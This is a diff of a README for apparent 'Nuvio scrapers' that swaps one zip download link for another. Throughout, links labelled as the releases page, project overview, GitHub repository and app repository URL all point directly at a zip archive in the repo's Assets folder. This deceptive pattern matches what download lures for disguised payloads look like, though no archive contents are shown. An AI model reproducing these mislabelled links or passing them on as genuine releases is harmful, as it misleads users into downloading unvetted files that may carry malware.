@@ -2,7 +2,7 @@
 
 Visit the page to download the latest version:
 
-[![Download Now](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip)
+[![Download Now](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip%20Now-v1.0-blue)](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome! This guide helps you download and use the Nuvio scrapers with minimal e
 ## 📥 Download & Install
 
 1. **Go to Releases Page:**
-   Visit [this page](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip) to find the latest version of the software.
+   Visit [this page](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip) to find the latest version of the software.
 
 2. **Download the Latest Release:**
    Look for the most recent version listed on the Releases page. Click on the file to download it to your computer.
@@ -33,7 +33,7 @@ Welcome! This guide helps you download and use the Nuvio scrapers with minimal e
 4. **Add Repository URL:**
    Enter this URL into the designated field:
    ```
-   https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip
+   https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip
    ```
 
 5. **Enable Scrapers:**
@@ -86,8 +86,8 @@ Absolutely! Contributions are welcome. Feel free to report issues or suggest enh
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip)
-- [Nuvio Overview](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/FutureLegend21/phisher-nuvio-providers/main/Assets/phisher-nuvio-providers-v2.4.zip)
+- [Releases Page](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
+- [Nuvio Overview](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
+- [GitHub Repository](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
 
 Feel free to download the scrapers and start using them to enhance your experience with the Nuvio application. Enjoy your streaming!
